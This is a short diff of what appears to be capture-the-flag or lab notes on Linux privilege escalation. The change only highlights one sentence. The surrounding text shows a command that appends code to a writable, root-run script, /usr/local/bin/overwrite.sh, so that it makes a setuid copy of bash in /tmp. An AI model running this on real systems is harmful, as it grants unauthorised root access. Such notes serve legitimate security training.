@@ -21,7 +21,7 @@ ls -la /usr/local/bin/overwrite.sh
 - we can notice we have `read` and `write` permission on that file, so we can modify it
 
 
-In that case we just need to write on this file:
+<mark style="background: #BBFABBA6;">In that case we just need to write on this file:</mark>
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
 ```
